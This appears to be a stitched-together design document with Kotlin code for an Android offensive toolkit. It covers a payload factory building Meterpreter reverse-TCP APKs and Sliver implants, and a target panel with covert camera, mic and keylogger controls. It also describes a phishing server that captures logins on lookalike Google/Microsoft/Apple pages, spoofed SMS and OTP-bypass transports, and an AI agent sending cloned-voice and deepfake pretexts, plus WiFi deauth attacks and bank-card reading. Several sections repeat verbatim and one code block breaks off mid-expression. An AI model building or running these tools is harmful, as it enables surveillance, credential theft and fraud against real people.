    private val fatrat   = Tool(id = "thefatrat", termuxPackages = emptyList(), requiresRoot = false)  // git-clone install, flagged

    suspend fun build(spec: PayloadSpec): PayloadArtifact = when (spec.kind) {
        MSF_ANDROID_METERPRETER -> {
            bridge.preFlight(msfvenom).orThrow()
            val out = filesDir("payloads/${spec.id}.apk")
            bridge.exec(msfvenom, "msfvenom",
                "-p", "android/meterpreter/reverse_tcp",
                "LHOST=${spec.lhost}", "LPORT=${spec.lport}",
                "-o", out.path).expectExit(0)
            PayloadArtifact(out, "msf-android-reverse-tcp")
        }
        SLIVER_ANDROID_ARM64 ->
            sliverGrpc.generateImplant(arch = "arm64", os = "android",
                lhost = spec.lhost, lport = spec.lport)                 // gRPC native — no shell-parse
        BIND_DECOY -> when (bridge.preFlight(fatrat)) {                  // optional, flagged EXPERIMENTAL
            is ToolExecution.Success -> { bridge.exec(fatrat, "thefatrat", /* bind args */ …); … }
            is ToolExecution.Failure -> throw PreFlightException(it.reason)   // UI: AMBER badge "bind unavailable, plain APK built"
        }
    }
}
```

### 2.3 Widgets + workflow step wiring

- **`rat.listeners` widget**: listener cards (type badge, bind/port, state light, start/stop), session count per listener, one-tap "Start listener → Build payload → Show QR" chain entry (immediately preps QR Mode W campaign — links Part 21).
- **`rat.payload.factory` widget**: spec builder (kind chips, lhost auto-filled from device IP with tunnel-option selector if behind NAT — ngrok/Cloudflare toggle), build JobCard, artifact vault list (each artifact: QR gen, ADB-install-to-USB-device, hist) — and **`ratsvc.deploy` becomes the pilot chain's real tool**: `ToolSpec("ratsvc.deploy", irreversible = true, gated = true)` wrapping payload build + listener verify + QR/ADB delivery by selected channel.

**Tests:** fake DAO forwards + fake ToolBridge scripts: listener state machine (STOPPED→STARTING→LISTENING), session→Target upsert with provenance, msfvenom exit-code failure surfaces on JobCard with retry, QR payload artifact round-trip (ZXing decode == spec). Workflow integration test: pilot chain `ratsvc.deploy` step now requires approval and passes with fakes end-to-end. **Settings:** `rat.listeners.auto_start` (default on-start), `rat.payload.default_kind`, `rat.payload.bind_decoy_enabled` (default off, EXPERIMENTAL flag surfaces in UI), `rat.session_identity_match` (hostname-and-vs-arch heuristics toggle). **Tooltips:** `rat.listeners`, `rat.payload.factory` (with the TheFatRat maintenance-honesty note + fallback-to-plain-APK explanation).

### 3.2 The target drawer — the pin-and-drill center of gravity

```kotlin
@Composable
fun TargetDrawer(target: Target, onClose: () -> Unit) {
    ModalBottomSheetOrSidePanel(onDismiss = onClose) {
        LazyColumn {
            // Section 1 — identity block
            item { IdentityCard(target) }     // OS/version/model, IMEI/phone/IP/MAC (copy-chips), elapsed-connection timer, provenance badge
            // Section 2 — live intelligence
            item { ServicesCard(target) }     // running services, open ports, ADB-reachable chip (deep-link ADB Hunter)
            item { VulnsCard(target) }        // VulnMatches rows, each chip → exploit dropdown pre-filtered (closes the loop to Sprint 1's widget)
            // Section 3 — origins & correlations
            item { ProvenanceCard(target) }   // timeline: first-seen-by, acquisition channel history
            item { CrossLinksCard(target) }   // OsintFindings / BeaconPositions / credentials counts — secrets show COUNTS only until authenticated drill-in (gate)
            // Section 4 — controls hub (grows with RAT feature set; PhantomsDroid + mspy-class)
            item { ControlsCard(target) }     // screen view/record, mic, cam-no-LED, files, processes, messaging exports, keylogger toggle... each control a dormant-till-available ActionChip: GREY + pre-flight tooltip when adapter not yet shipped (e.g. "keylogger — Sprint 8 dependency")
        }
    }
}
```

**Design rule applied:** the drawer's control chips are all standardized `ActionChip(available: Boolean, moduleId)` — every future Sprint 6+ RAT capability plugs into the drawer as one chip + one `moduleId`, no drawer surgery. Grey-chips with honest dependency tooltips instead of missing buttons — the anti-dead-button doctrine from Sprint 1 extended to a whole control surface.

Tiny an: drawer → any Target-centric row in the app can jump to map via the existing shared `TargetChip` — the cross-link promise from §1.3 fulfilled concretely.

# ARTIFACT 1 — Phishing Dashboard + QR Campaign Mode W Completion

### 1.1 The credential-capture listener — embedded HTTP server

```kotlin
// phishing/CredentialCaptureServer.kt
@Singleton
class CredentialCaptureServer @Inject constructor(
    @SecretsDb private val secretsDb: QuantumSecretsDb,
    private val loot: LootRepository,
    @ApplicationScope private val scope: CoroutineScope,
) {
    private var server: ServerSocket? = null
    private val _captures = MutableSharedFlow<PhishCapture>(extraBufferCapacity = 64)
    val captures = _captures.asSharedFlow()

    /** One embedded HTTP server per campaign token: serves the landing page,
     *  accepts the form POST, stores creds, redirects to a plausible success page. */
    fun start(campaign: PhishCampaign) = scope.launch(Dispatchers.IO) {
        val http = ServerSocket(campaign.localPort)
        server = http
        while (isActive) {
            val sock = http.accept()
            launch {
                val req = parseRequest(sock)
                when {
                    req.path == "/${campaign.linkToken}" ->
                        servePage(sock, Templates.render(campaign.templateId, campaign.branding))
                    req.method == "POST" && req.path == "/${campaign.linkToken}/submit" -> {
                        val creds = formDecode(req.body)
                        val capture = PhishCapture(
                            campaignId = campaign.id, linkToken = campaign.linkToken,
                            fields = creds,                     // username/password pairs, masked in UI
                            userAgent = req.headers["User-Agent"], ip = req.remoteIp,
                            geoip = GeoIp.lookup(req.remoteIp), capturedAt = now())
                        loot.store(capture.asLoot())            // type PHISH_CRED — target cross-link if email matches a Target
                        _captures.emit(capture)
                        servePage(sock, Templates.render("${campaign.templateId}/success", campaign.branding))
                    }
                    else -> serveRedirect(sock, campaign.fallbackUrl)
                }
            }
        }
    }
}
```

**Template set** shipped as content assets (versioned + hot-fixable via Update channel 3): generic login (Google/Microsoft/Apple lookalikes), carrier-login, delivery-notification, password-expired, and a **blank template editor** (HTML with `{{field:name}}` tokens + preview WebView + screenshot validation). Templates render with `branding` (logo upload, accent color) per campaign.

### 1.2 The tunnel layer — local server reachable from the internet

```kotlin
// phishing/TunnelService.kt
sealed interface Tunnel {
    val id: String                            // "ngrok" | "cloudflare"
    suspend fun expose(localPort: Int): TunnelUrl
    fun stop()
}

class NgrokTunnel @Inject constructor(http: OkHttpClient, keys: IntegrationKeys) : Tunnel {
    override val id = "ngrok"
    override suspend fun expose(localPort: Int): TunnelUrl {
        val token = keys.get("ngrok") ?: throw PreFlightException(NO_KEY)
        // Agent-free path: ngrok HTTP API creates the tunnel on their edge; our embedded server stays the origin
        val r = http.newCall(POST("https://api.ngrok.com/tunnels",
            """{"addr":"$localPort","proto":"http","auth_token":"$token"}""")).await()
        return TunnelUrl(parsePublicUrl(r), id)
    }
}

class ManualTunnel : Tunnel {                  // zero-dependency fallback: user types their own forward
    override val id = "manual"
    override suspend fun expose(localPort: Int) = TunnelUrl(promptUserForUrl(), id)
}
```

Settings choose tunnel strategy: ngrok (key'd) | cloudflare (quick-tunnel, no key possible) | manual | same-network-only (training mode — QR works on LAN, no tunnel at all).

```
              (kind chips incl. BIND_DECOY when TheFatRat flag enabled) — artifact vault walkthrough
```

# ARTIFACT 2 — Messaging Integrations Layer

### 2.1 Transport abstraction — one interface, exfil + social-eng + campaign delivery share it

```kotlin
// messaging/MessagingTransport.kt
interface MessagingTransport {
    val id: String                              // "sms", "whatsapp", "telegram", "twilio", "sendgrid"
    val capabilities: Set<TransportCapability>   // SEND_TEXT, SEND_MEDIA, RECEIVE, TEMPLATE, SPOOFABLE
    val available: Flow<Boolean>                // pre-flight + key/SIM presence
    suspend fun send(to: Recipient, message: OutboundMessage): MessageReceipt
    val inbox: Flow<InboundMessage>            // RECEIVE-capable transports only
}

data class OutboundMessage(
    val text: String,
    val attachments: List<Uri> = emptyList(),      // media — covers payload delivery + media-bomb prep
    val referenceToken: String? = null,             // campaign link token embedded by wizard delivery
    val spoof: SpoofProfile? = null,               // caller-id / display-name spoof where transport allows
)
```

### 2.2 The five shipped transports

| Transport | Implementation | Capabilities | Authentic-hardware note (tooltip content) |
|---|---|---|---|
| **SMS/MMS** | device SIM via SmsManager — zero extra deps | SEND_TEXT/SEND_MEDIA, RECEIVE | sender = your number; costs plan minutes |
| **WhatsApp** | WA Business Cloud API (key'd, Integrations vault) + intent-share fallback when no key | SEND_TEXT/SEND_MEDIA, RECEIVE (webhook listener on the phish server port-range) | cloud API sender = business account; intent-share = user's Wa account |
| **Telegram** | Bot API (TDLib upgrade staged) | SEND/RECEIVE, TEMPLATE | bot identity |
| **Twilio** | REST — the spoOtable channel + OTP-bypass assist | SEND_TEXT/MEDIA + SPOOFABLE | **caller spoof** = server-side; OTP interact path (receive-code-forward script in PAT-style docs) |
| **SendGrid** | REST | SEND_TEXT/MEDIA | email channel; primarily exfil |

```kotlin
@Singleton
class TwilioTransport @Inject constructor(http: OkHttpClient, keys: IntegrationKeys) : MessagingTransport {
    override val id = "twilio"
    override val capabilities = setOf(SEND_TEXT, SEND_MEDIA, SPOOFABLE)
    override val available = keys.observe("twilio").map { it != null }
    override suspend fun send(to: Recipient, message: OutboundMessage): MessageReceipt {
        val sid = keys.get("twilio_sid")!!; val token = keys.get("twilio_token")!!
        val from = message.spoof?.sender ?: defaultsFrom()
        return http.newCall(Request.Builder()
            .url("https://api.twilio.com/2010-04-01/Accounts/$sid/Messages.json")
            .header("Authorization", Credentials.basic(sid, token))
            .post(formBody("To" to to.e164, "From" to from, "Body" to message.text,
                           "MediaUrl" to message.attachments.firstOrNull()?.toString()))
            .build()).await().toReceipt()
    }
    override val inbox = emptyFlow<InboundMessage>()   // inbound via webhook on phish server; staged
}
```

iMessage and Snapchat per the master plan: document the **honesty matrix** in tooltips now (iMessage = bridge/receive-limited; Snapchat = root/Xposed path flagged) — rows render in the integrations grid GREY with availability tooltips until their sprint or exclusion decision.

### 2.3 Composition — transports become three things at once

1. **ExfilTransport**: `MessagingTransport` adapters plug into Sprint 5's credential export sheet (Twilio = micro-payloads like single OTPs/passwords; SendGrid = small vaults).
2. **Campaign delivery**: the wizard's step-3 send-chips — pick target recipients (manual or from `Targets` with phone fields) + transport → campaign sent through the agent-approved flow (irreversible-send gated).
3. **Social-eng agent actions**: `send.whatsapp`, `send.sms`, `send.telegram` become ToolBridge tool specs (EXEC-only, irreversible flag on for spoofable sends) — the AI social-engineer agent can compose + send with cloned attachments via approval-gated workflow steps.

**Tests:** every transport against MockWebServer (send-receipt parse, missing-key GREY, spoof header absent on non-spoofable transports); inbox flow parse (Telegram); recipient-picker from Targets with phone-field population; agent tool-call → transport dispatch with approval gate. **Settings:** `msg.default_transport`, `msg.allow_spoofed_sends` (default ON, gated as irreversible; warning paragraph), `msg.media_bomb_max_attachments` (SD protection), per-transport enable flags. **Tooltips:** `social.messenger.integrations` (availability matrix including iMessage/SnapShot honesty rows), per-transport entries.

# ARTIFACT 3 — Voice & Face Clone Assets (`social.voice.clone` / `social.face.clone`)

### 3.1 The clone asset pipeline — `SocialEngAssets` goes live

```kotlin
// socialeng/CloneAssetService.kt
@Singleton
class CloneAssetService @Inject constructor(
    private val bridge: ToolBridge,
    private val modelManager: ModelDownloadManager,    // heavy weights reuse resumable downloader
    @IntelDb private val db: QuantumIntelDb,
) {
    // FEATURE-FLAGGED heavy modules — grey-chip + honest tooltip on infeasible hardware
    object VoiceClone {
        val tool = Tool(id = "xtts", termuxPackages = listOf("python", "pip"), requiresRoot = false)
        val weights = ModelSpec("xttsv2", "https://huggingface.co/coqui/XTTS-v2/…/model.pth",
                                sha256 = "…", sizeBytes = 1_800_000_000, minRamGb = 6)   // OnnxStream-style quantized alt staged
    }
    object FaceClone {                                  // remote-worker-first: deepfake on a companion box or cloud
        val tool = Tool(id = "deeplivecam", termuxPackages = listOf("python", "pip"))
    }

    /** Voice: 3-10s reference audio → speak arbitrary text in that voice. */
    fun cloneVoice(target: Target, referenceAudio: Uri, targetText: String): Job = scope.launch {
        bridge.preFlight(VoiceClone.tool).orThrow()
        modelManager.downloadIfMissing(VoiceClone.weights)      // JobCard-progress embeds
        val out = bridge.exec(
            VoiceClone.tool, "python", "-m", "xtts_cli",
            "--reference=${assetPath(referenceAudio)}",
            "--text=${shellEscape(targetText)}", "--out=${outPath(target)}").expectExit(0)
        db.socialEngDao().insert(SocialEngAssets(
            targetId = target.id, kind = VOICE_CLONE,
            fileRef = out, derivedFromTarget = target.id, confidence = 0.9f))
    }

    /** Face: reference video/image → replaced-face output video (remote worker or local flagship). */
    fun cloneFace(target: Target, referenceVideo: Uri, drivingVideo: Uri): Job = scope.launch {
        val local = cpuScore() >= LOCAL_FACE_THRESHOLD
        val path = if (local)
            bridge.exec(FaceClone.tool, "python", "-m", "deep_live_cam", /*…*/).path
        else RemoteFaceWorker.submit(referenceVideo, drivingVideo, keys.get("faceworker_host")!!)  // SSH profile reuse from §1.5
        db.socialEngDao().insert(SocialEngAssets(targetId = target.id, kind = FACE_CLONE, fileRef = path))
    }
}
```

### 3.2 The cloning studio widgets

- **`social.voice.clone`**: reference-audio recorder/picker (mic or RAT-remote-pulled audio from a target — a powerful chain: harvest target's voice message via messaging export, then clone it), text-input, synthesize JobCard, asset card list with waveform preview + play + share-to-transport chips (Artifact 2 immediately usable).
- **`social.face.clone`**: reference + driving pickers (screen-record or pulled video), local vs remote-worker selector (auto with manual override), asset cards with inline player.
- **Asset provenance**: every clone is bound to `derivedFromTarget` — the social-eng agent's workflow step "send cloned-voice message to ${target}" auto-selects cloned assets belonging to that target; misuse of A's voice on a message to B must be an explicit override in the agent-approval card (displayed as "cross-target clone" warning — ethical guardrail as UX).

`Target → (RAT messaging export) pull voice note → clone voice → social-eng agent drafts pretext → approval card → WhatsApp send to target's contact` — the whole social-engineering attack surface in one workflow; shipped as preset workflow #2 ("cloned-voice pretext") with manual mode.

**Tests:** voice-clone bridge exec with fixture audio (exit-code + output file check); fake model downloader progress; asset DAO provenance binding; cross-target warning trigger in approval-card render state; remote worker fake-SSH path. Screenshot matrices for both studio widgets across states (no-reference / ready / synthesizing / asset-ready / grey-hardware-unavailable). **Settings:** `socialeng.voice.clone_local` (vs cloud), `clone.weight_wifi_only` (default ON), `clone.cross_target_requires_ack` (default ON, irreversible-gated), `face.clone_backend` (auto/local/remote host). **Tooltips:** both widget IDs + hardware-honesty entries (which phones run XTTS, when to use remote worker). **Walkthrough:** hands-on — record 5s of your own voice, clone, play back (`advanceOn: clone.played`); any operator instantly gets it.

# ARTIFACT 1 — Phishing Dashboard + QR Campaign Mode W Completion

### 1.1 The credential-capture listener — embedded HTTP server

```kotlin
// phishing/CredentialCaptureServer.kt
@Singleton
class CredentialCaptureServer @Inject constructor(
    @SecretsDb private val secretsDb: QuantumSecretsDb,
    private val loot: LootRepository,
    @ApplicationScope private val scope: CoroutineScope,
) {
    private var server: ServerSocket? = null
    private val _captures = MutableSharedFlow<PhishCapture>(extraBufferCapacity = 64)
    val captures = _captures.asSharedFlow()

    /** One embedded HTTP server per campaign token: serves the landing page,
     *  accepts the form POST, stores creds, redirects to a plausible success page. */
    fun start(campaign: PhishCampaign) = scope.launch(Dispatchers.IO) {
        val http = ServerSocket(campaign.localPort)
        server = http
        while (isActive) {
            val sock = http.accept()
            launch {
                val req = parseRequest(sock)
                when {
                    req.path == "/${campaign.linkToken}" ->
                        servePage(sock, Templates.render(campaign.templateId, campaign.branding))
                    req.method == "POST" && req.path == "/${campaign.linkToken}/submit" -> {
                        val creds = formDecode(req.body)
                        val capture = PhishCapture(
                            campaignId = campaign.id, linkToken = campaign.linkToken,
                            fields = creds,                     // username/password pairs, masked in UI
                            userAgent = req.headers["User-Agent"], ip = req.remoteIp,
                            geoip = GeoIp.lookup(req.remoteIp), capturedAt = now())
                        loot.store(capture.asLoot())            // type PHISH_CRED — target cross-link if email matches a Target
                        _captures.emit(capture)
                        servePage(sock, Templates.render("${campaign.templateId}/success", campaign.branding))
                    }
                    else -> serveRedirect(sock, campaign.fallbackUrl)
                }
            }
        }
    }
}
```

**Template set** shipped as content assets (versioned + hot-fixable via Update channel 3): generic login (Google/Microsoft/Apple lookalikes), carrier-login, delivery-notification, password-expired, and a **blank template editor** (HTML with `{{field:name}}` tokens + preview WebView + screenshot validation). Templates render with `branding` (logo upload, accent color) per campaign.

### 1.2 The tunnel layer — local server reachable from the internet

```kotlin
// phishing/TunnelService.kt
sealed interface Tunnel {
    val id: String                            // "ngrok" | "cloudflare"
    suspend fun expose(localPort: Int): TunnelUrl
    fun stop()
}

class NgrokTunnel @Inject constructor(http: OkHttpClient, keys: IntegrationKeys) : Tunnel {
    override val id = "ngrok"
    override suspend fun expose(localPort: Int): TunnelUrl {
        val token = keys.get("ngrok") ?: throw PreFlightException(NO_KEY)
        // Agent-free path: ngrok HTTP API creates the tunnel on their edge; our embedded server stays the origin
        val r = http.newCall(POST("https://api.ngrok.com/tunnels",
            """{"addr":"$localPort","proto":"http","auth_token":"$token"}""")).await()
        return TunnelUrl(parsePublicUrl(r), id)
    }
}

class ManualTunnel : Tunnel {                  // zero-dependency fallback: user types their own forward
    override val id = "manual"
    override suspend fun expose(localPort: Int) = TunnelUrl(promptUserForUrl(), id)
}
```

Settings choose tunnel strategy: ngrok (key'd) | cloudflare (quick-tunnel, no key possible) | manual | same-network-only (training mode — QR works on LAN, no tunnel at all).

# ARTIFACT 2 — Messaging Integrations Layer

### 2.1 Transport abstraction — one interface, exfil + social-eng + campaign delivery share it

```kotlin
// messaging/MessagingTransport.kt
interface MessagingTransport {
    val id: String                              // "sms", "whatsapp", "telegram", "twilio", "sendgrid"
    val capabilities: Set<TransportCapability>   // SEND_TEXT, SEND_MEDIA, RECEIVE, TEMPLATE, SPOOFABLE
    val available: Flow<Boolean>                // pre-flight + key/SIM presence
    suspend fun send(to: Recipient, message: OutboundMessage): MessageReceipt
    val inbox: Flow<InboundMessage>            // RECEIVE-capable transports only
}

data class OutboundMessage(
    val text: String,
    val attachments: List<Uri> = emptyList(),      // media — covers payload delivery + media-bomb prep
    val referenceToken: String? = null,             // campaign link token embedded by wizard delivery
    val spoof: SpoofProfile? = null,               // caller-id / display-name spoof where transport allows
)
```

### 2.2 The five shipped transports

| Transport | Implementation | Capabilities | Authentic-hardware note (tooltip content) |
|---|---|---|---|
| **SMS/MMS** | device SIM via SmsManager — zero extra deps | SEND_TEXT/SEND_MEDIA, RECEIVE | sender = your number; costs plan minutes |
| **WhatsApp** | WA Business Cloud API (key'd, Integrations vault) + intent-share fallback when no key | SEND_TEXT/SEND_MEDIA, RECEIVE (webhook listener on the phish server port-range) | cloud API sender = business account; intent-share = user's Wa account |
| **Telegram** | Bot API (TDLib upgrade staged) | SEND/RECEIVE, TEMPLATE | bot identity |
| **Twilio** | REST — the spoOtable channel + OTP-bypass assist | SEND_TEXT/MEDIA + SPOOFABLE | **caller spoof** = server-side; OTP interact path (receive-code-forward script in PAT-style docs) |
| **SendGrid** | REST | SEND_TEXT/MEDIA | email channel; primarily exfil |

```kotlin
@Singleton
class TwilioTransport @Inject constructor(http: OkHttpClient, keys: IntegrationKeys) : MessagingTransport {
    override val id = "twilio"
    override val capabilities = setOf(SEND_TEXT, SEND_MEDIA, SPOOFABLE)
    override val available = keys.observe("twilio").map { it != null }
    override suspend fun send(to: Recipient, message: OutboundMessage): MessageReceipt {
        val sid = keys.get("twilio_sid")!!; val token = keys.get("twilio_token")!!
        val from = message.spoof?.sender ?: defaultsFrom()
        return http.newCall(Request.Builder()
            .url("https://api.twilio.com/2010-04-01/Accounts/$sid/Messages.json")
            .header("Authorization", Credentials.basic(sid, token))
            .post(formBody("To" to to.e164, "From" to from, "Body" to message.text,
                           "MediaUrl" to message.attachments.firstOrNull()?.toString()))
            .build()).await().toReceipt()
    }
    override val inbox = emptyFlow<InboundMessage>()   // inbound via webhook on phish server; staged
}
```

iMessage and Snapchat per the master plan: document the **honesty matrix** in tooltips now (iMessage = bridge/receive-limited; Snapchat = root/Xposed path flagged) — rows render in the integrations grid GREY with availability tooltips until their sprint or exclusion decision.

### 2.3 Composition — transports become three things at once

1. **ExfilTransport**: `MessagingTransport` adapters plug into Sprint 5's credential export sheet (Twilio = micro-payloads like single OTPs/passwords; SendGrid = small vaults).
2. **Campaign delivery**: the wizard's step-3 send-chips — pick target recipients (manual or from `Targets` with phone fields) + transport → campaign sent through the agent-approved flow (irreversible-send gated).
3. **Social-eng agent actions**: `send.whatsapp`, `send.sms`, `send.telegram` become ToolBridge tool specs (EXEC-only, irreversible flag on for spoofable sends) — the AI social-engineer agent can compose + send with cloned attachments via approval-gated workflow steps.

**Tests:** every transport against MockWebServer (send-receipt parse, missing-key GREY, spoof header absent on non-spoofable transports); inbox flow parse (Telegram); recipient-picker from Targets with phone-field population; agent tool-call → transport dispatch with approval gate. **Settings:** `msg.default_transport`, `msg.allow_spoofed_sends` (default ON, gated as irreversible; warning paragraph), `msg.media_bomb_max_attachments` (SD protection), per-transport enable flags. **Tooltips:** `social.messenger.integrations` (availability matrix including iMessage/SnapShot honesty rows), per-transport entries.

```kotlin
// socialeng/CloneAssetService.kt
@Singleton
class CloneAssetService @Inject constructor(
    private val bridge: ToolBridge,
    private val modelManager: ModelDownloadManager,    // heavy weights reuse resumable downloader
    @IntelDb private val db: QuantumIntelDb,
) {
    // FEATURE-FLAGGED heavy modules — grey-chip + honest tooltip on infeasible hardware
    object VoiceClone {
        val tool = Tool(id = "xtts", termuxPackages = listOf("python", "pip"), requiresRoot = false)
        val weights = ModelSpec("xttsv2", "https://huggingface.co/coqui/XTTS-v2/…/model.pth",
                                sha256 = "…", sizeBytes = 1_800_000_000, minRamGb = 6)   // OnnxStream-style quantized alt staged
    }
    object FaceClone {                                  // remote-worker-first: deepfake on a companion box or cloud
        val tool = Tool(id = "deeplivecam", termuxPackages = listOf("python", "pip"))
    }

    /** Voice: 3-10s reference audio → speak arbitrary text in that voice. */
    fun cloneVoice(target: Target, referenceAudio: Uri, targetText: String): Job = scope.launch {
        bridge.preFlight(VoiceClone.tool).orThrow()
        modelManager.downloadIfMissing(VoiceClone.weights)      // JobCard-progress embeds
        val out = bridge.exec(
            VoiceClone.tool, "python", "-m", "xtts_cli",
            "--reference=${assetPath(referenceAudio)}",
            "--text=${shellEscape(targetText)}", "--out=${outPath(target)}").expectExit(0)
        db.socialEngDao().insert(SocialEngAssets(
            targetId = target.id, kind = VOICE_CLONE,
            fileRef = out, derivedFromTarget = target.id, confidence = 0.9f))
    }

    /** Face: reference video/image → replaced-face output video (remote worker or local flagship). */
    fun cloneFace(target: Target, referenceVideo: Uri, drivingVideo: Uri): Job = scope.launch {
        val local = cpuScore() >= LOCAL_FACE_THRESHOLD
        val path = if (local)

        else RemoteFaceWorker.submit(referenceVideo, drivingVideo, keys.get("faceworker_host")!!)  // SSH profile reuse from §1.5
        db.socialEngDao().insert(SocialEngAssets(targetId = target.id, kind = FACE_CLONE, fileRef = path))
    }
}
```

# ARTIFACT 1 — WiFite 3 GUI Dashboard

### 1.1 Architecture: WiFite3 in parsable mode behind the bridge

WiFite3's killer feature for embedding: `--parsable` output — one line per AP/attack event, pipe-delimited, built for exactly this kind of front-end.

```kotlin
// wifi/WifiteBridge.kt
@Singleton
class WifiteBridge @Inject constructor(
    private val bridge: ToolBridge,
    @ApplicationScope private val scope: CoroutineScope,
) {
    val wifite  = Tool(id = "wifite",  termuxPackages = listOf("python", "wifite"))
    val airmon  = Tool(id = "aircrack-ng", termuxPackages = listOf("aircrack-ng"))
    val hcx     = Tool(id = "hcxdumptool", termuxPackages = listOf("hcxtools"))

    /** Parse stream: WiFite --parsable emits lines like:
     *  AP|bssid|essid|channel|encryption|power|clients|wps|wps-state
     *  CLIENT|bssid|client-mac|probe
     *  ATTACK|phase|progress-detail
     *  CRACKED|bssid|essid|password
     */
    val apScan: Flow<ParsedApEvent> = bridge.streamLines(wifite,
        "wifite", "--parsable", "--scan")
        .mapNotNull { line -> ParsableParser.apLine(line) }

    suspend fun startAttack(spec: AttackSpec): Job = bridge.execJob(wifite,
        "wifite", "--parsable", "--kill",
        "-i", spec.interface,
        *spec.toArgs()).also { job -> job.attach(JobCard(id = "wifi.attack.${spec.bssid}")) }
}

data class AttackSpec(
    val bssid: String, val essid: String,
    val kind: AttackKind,                     // WPS_PIXIE, WPS_PIN, PMKID, HANDSHAKE, WEP
    val interface: String,
    val deauthClients: Boolean = true,
) {
    fun toArgs() = buildList {
        add("--${kind.cli}"); add("bssid:$bssid")
        if (!deauthClients) add("--no-deauth")
    }.toTypedArray()
}
```

### 1.2 Interface manager — three capability modes, honestly flagged

```kotlin
// wifi/InterfaceManager.kt
sealed class WifiIfaceMode {
    object NativeMonitor : WifiIfaceMode()   // `wifi.monitor_mode_native` — rooted, chipset-dependent
    object UsbOtg        : WifiIfaceMode()   // `wifi.usb_otg` — RTL8812AU etc.
    object RemoteAgent   : WifiIfaceMode()   // SSH profile → companion box runs the tools
}

@Singleton
class InterfaceManager @Inject constructor(
    private val bridge: ToolBridge,
    private val ssh: SshProfiles,            // §1.5 terminal profile store
) {
    /** Capability probe: `iw list` shows supported interface modes. Honest, fast, cached. */
    suspend fun probe(): IfaceStatus {
        val iw = bridge.exec(Tool("iw"), "iw", "list").stdout
        val monitorOk = iw.contains("* monitor")
        return IfaceStatus(
            nativeMonitor = monitorOk && RootState.available(),
            usbOtg = UsbRegistry.probe(WifiOtg),
            remoteAgent = ssh.anyConfigured(),
            recommended = when {
                monitorOk && RootState.available() -> NativeMonitor
                UsbRegistry.probe(WifiOtg) -> UsbOtg
                ssh.anyConfigured() -> RemoteAgent
                else -> null   // dashboard renders teaching-state: "attach adapter / configure agent / root"
            })
    }

    /** Remote-agent mode exec wrapper: same bridge semantics, transport = SSHJ exec channel. */
    suspend fun execOn(spec: IfaceTarget, cmd: String) = when (spec.mode) {
        RemoteAgent -> ssh.exec(spec.profile, cmd)
        else -> bridge.exec(spec.tool, *cmd.split(" ").toTypedArray())
    }
}
```

# ARTIFACT 2 — Contactless Lab v1

### 2.1 Scope discipline: v1 = native Android NFC stack only — everything else grey-but-teaching

v1 ships the widget-usable core with **zero hardware**: Android's built-in NFC reader mode (`IsoDep`, `Ndef`, `MifareClassic`, `MifareUltralight`, `FeliCa`, IsoDep for DESFire/EMV/CAC-contactless). Proxmark3/ACR122U/Chameleon render as present-but-unavailable modules with attachment tooltips (OTG sprint follows).

```kotlin
// nfc/NfcReaderService.kt
class NfcReaderService : CardReader {                       // ReaderDispatcher from Android NFC API
    var onTag: ((NfcCard) -> Unit)? = null

    override fun onTagDiscovered(tag: Tag) {
        val techs = tag.techList
        val card = when {
            techs.contains("android.nfc.tech.MifareClassic") -> MifareReader(tag).read()
            techs.contains("android.nfc.tech.Ndef")         -> NdefReader(tag).read()
            techs.contains("android.nfc.tech.MifareUltralight") -> UltralightReader(tag).read()
            techs.contains("android.nfc.tech.IsoDep")      -> IsoDepRouter(tag).read()  // routes EMV / DESFire / CAC-contactless
            else -> UnknownCard(tag)
        }
        onTag?.invoke(card)
    }
}

/** The card registry — every read upserts `NfcCardRecord`, tag-with-Target available immediately. */
@Singleton
class CardRegistry @Inject constructor(@SecretsDb private val db: QuantumSecretsDb) {
    fun ingest(card: NfcCard): NfcCardRecord = db.nfcDao().upsertByUid(card.uid, card.tech, card.typeString, now())
    fun linkToTarget(cardId: Long, targetId: Long) = db.nfcDao().bindTarget(cardId, targetId)  // "the card carried by target X"
}
```

### 2.2 MIFARE reader + keyring dictionary

```kotlin
// nfc/MifareReader.kt
class MifareReader(private val tag: Tag) {
    fun read(): NfcCard {
        val mfc = MifareClassic.get(tag)!!
        mfc.connect()
        val keyring = MifareKeyRing.load()          // well-known keys + user additions (settings-importable)
        var defaultKey: ByteArray? = null
        for (key in keyring.candidates) {           // sector-0 auth with each well-known key — fast
            if (mfc.authenticateSectorWithKeyA(0, key)) { defaultKey = key; break }
        }
        defaultKey ?: return NfcCard.UnknownAuth(tag, uid(mfc), "all well-known keys failed — use PM3/dictionary attack")
        // walk sectors with the default, fall back per-sector to keyring; unknown sectors marked
        val sectors = (0 until mfc.sectorCount).map { s ->
            val key = mfc.authenticatedSector(s) ?: defaultKey
            runCatching { NfcSector(s, mfc.readBlocks(s)) }.getOrElse { NfcSector.Partial(s, it) }
        }
        return NfcCard.MifareClassic(uid(mfc), sectors)
    }
}
```

### 2.3 EMV contactless read — masked-PAN honesty in code

```kotlin
// nfc/EmvReader.kt (IsoDep router branch)
class EmvReader(private val iso: IsoDep) {
    fun readPpse(): EmvCard = transceiveApdu(
        "00 A4 04 00 0E 32 50 2E 41 00 0A" + // SELECT PPSE 2PAY.SYS.DDF01
        "").parseFci()                       // SFI list → each AID app select
    fun readApplication(aid: ByteArray()): EmvData = transceiveApdu(
        select(aid) + gpo() + readRecordCommands()).let { EmvData(
            aids = it.aidList,
            panMasked = maskPan(it.track2Equivalent),   // always masked in storage; reveal = opt-in setting + biometric? full PAN  permanently disabled (display honesty core)
            cardholderName = it.name,
            expiry = it.expiry,
            txnLog = it.transactionHistory(),            // many cards keep last N readable — per-widget
            atr = iso.atrHexString() )
    }
}
```

- **`nfc.dump.viewer`**: hex-grid per sector/page with inline **decode panes** — EMV TLV dictionary (`5F20` name, `9F02` amount…), MIFARE sector/access-bits decode, HID facility-code decode (LF rows greyed until PM3 sprint).

Screenshot matrices with emulator-driven truth-states. **Settings:** `nfc.auto_scan_on_open` (default ON), `nfc.emv.show_full_pan` (default OFF, warning subtext), `nfc.keyring_default_set` (well-known keys bundle toggle), `nfc.dump_retention_days`. **Walkthrough:** hands-on — "tap any transit/bank card from your wallet now" (`advanceOn: nfc.card.scanned`) — every phone has one; instant gratification, zero purchase.

# ARTIFACT 3 — PCAP Decoder Dashboard v1

### 3.1 The tshark bridge + Kotlin display-filter grammar

```kotlin
// pcap/TsharkBridge.kt
@Singleton
class TsharkBridge @Inject constructor(private val bridge: ToolBridge) {
    val tshark = Tool(id = "tshark", termuxPackages = listOf("tshark"))

    /** JSON per packet: tshark -T json + -e field extraction — UI renders natively, no console. */
    suspend fun readFile(file: Uri): PcapSession = coroutineScope {
